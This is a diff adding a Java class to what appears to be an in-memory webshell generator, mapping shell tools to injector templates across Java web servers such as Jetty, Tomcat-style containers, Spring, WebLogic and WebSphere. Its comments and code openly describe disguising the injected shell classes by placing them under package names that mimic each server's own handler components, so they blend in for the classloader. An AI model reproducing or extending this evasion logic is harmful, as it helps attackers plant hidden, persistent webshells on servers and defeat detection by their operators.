@@ -1,0 +1,131 @@
+package com.reajason.javaweb.memshell.server;
+
+import com.reajason.javaweb.Server;
+import com.reajason.javaweb.memshell.config.InjectorConfig;
+import com.reajason.javaweb.memshell.config.ShellConfig;
+import com.reajason.javaweb.memshell.config.ShellToolConfig;
+import com.reajason.javaweb.utils.CommonUtil;
+import com.reajason.javaweb.utils.StringUtils;
+import com.reajason.javaweb.utils.tuple.Pair;
+
+import java.util.Collections;
+import java.util.LinkedHashMap;
+import java.util.Map;
+import java.util.Set;
+
+/**
+ * @author ReaJason
+ * @since 2024/12/7
+ */
+public abstract class AbstractServer {
+
+    private final Map<String, ToolMapping> map = new LinkedHashMap<>();
+
+    /**
+     * 定义注入器映射
+     *
+     * @return 注入器映射
+     */
+    public abstract InjectorMapping getShellInjectorMapping();
+
+    public Class<?> getListenerInterceptor() {
+        return null;
+    }
+
+    /**
+     * shellBytes 生成完成后的 server 专属改写钩子：可改写字节码（如 Jetty Handler 按版本换父类）、
+     * 向 {@code injectorConfig} 贡献 helper 类（如 Dubbo 接口、WebSocket 绕过 helper）、调整 urlPattern。
+     * 默认原样返回。
+     *
+     * @return 改写后的 shell 字节码
+     */
+    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
+                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
+        return shellBytes;
+    }
+
+    public void addToolMapping(String shellTool, ToolMapping mapping) {
+        map.put(shellTool, mapping);
+    }
+
+    /**
+     * 获取内存马功能所支持的注入类型列表
+     *
+     * @param shellTool 内存马功能
+     * @return shellTypes
+     */
+    public Set<String> getSupportedShellTypes(String shellTool) {
+        ToolMapping toolMapping = map.get(shellTool);
+        if (toolMapping == null) {
+            return Collections.emptySet();
+        }
+        // 与 getShellInjectorPair 共用同一份过滤结果：缺少注入器模板的类型不能对外暴露，
+        // 否则会广告出一个生成时必然失败的类型
+        return Collections.unmodifiableSet(toolMapping.getShellClassMap(getShellInjectorMapping()).keySet());
+    }
+
+    public Set<String> getSupportedShellTools() {
+        return Collections.unmodifiableSet(map.keySet());
+    }
+
+    /**
+     * @return left: shell template class name, right: injector template class name
+     */
+    public Pair<String, String> getShellInjectorPair(String shellTool, String shellType) {
+        if (StringUtils.isBlank(shellTool)) {
+            throw new IllegalArgumentException("shellTool is required");
+        }
+        ToolMapping mapping = map.get(shellTool);
+        if (mapping == null) {
+            throw new UnsupportedOperationException("please implement shell type: " + shellType + " for " + shellTool);
+        }
+        Map<String, Pair<String, String>> shellClassMap = mapping.getShellClassMap(getShellInjectorMapping());
+        return shellClassMap.get(shellType);
+    }
+
+    /**
+     * 生成内存马类名：类名会被放进与目标中间件同名的包下，让内存马在类加载器视角里不显突兀。
+     *
+     * @param serverName 中间件名称，取值见 {@link com.reajason.javaweb.Server}
+     * @param shellType  内存马类型，作为类名后缀
+     */
+    public static String generateShellClassName(String serverName, String shellType) {
+        return getWebPackageName(serverName)
+                + "." + CommonUtil.getRandomString(5)
+                + "." + CommonUtil.getRandomMiddlewareName() + shellType;
+    }
+
+    /**
+     * 各中间件对应的、看起来像是框架自身组件的包名
+     */
+    public static String getWebPackageName(String serverName) {
+        switch (serverName) {
+            case Server.Jetty5:
+                return "org.mortbay.jetty.servlet.handlers";
+            case Server.Jetty:
+                return "org.eclipse.jetty.servlet.handlers";
+            case Server.Undertow:
+                return "io.undertow.servlet.handlers";
+            case Server.SpringWebMvc:
+                return "org.springframework.boot.mvc.handlers";
+            case Server.SpringWebFlux:
+                return "org.springframework.boot.webflux.handlers";
+            case Server.WebSphere:
+                return "com.ibm.ws.webcontainer.handlers";
+            case Server.WebLogic:
+                return "weblogic.servlet.internal.handlers";
+            case Server.Resin:
+                return "com.caucho.server.dispatch.handlers";
+            case Server.Resin2:
+                return "com.caucho.server.http.handlers";
+            case Server.BES:
+                return "com.bes.enterprise.webtier.web.handlers";
+            case Server.Apusic:
+                return "com.apusic.web.handlers";
+            case Server.InforSuite:
+                return "com.cvicse.inforsuite.web.handlers";
+            default:
+                return "org.apache.http.web.handlers";
+        }
+    }
+}
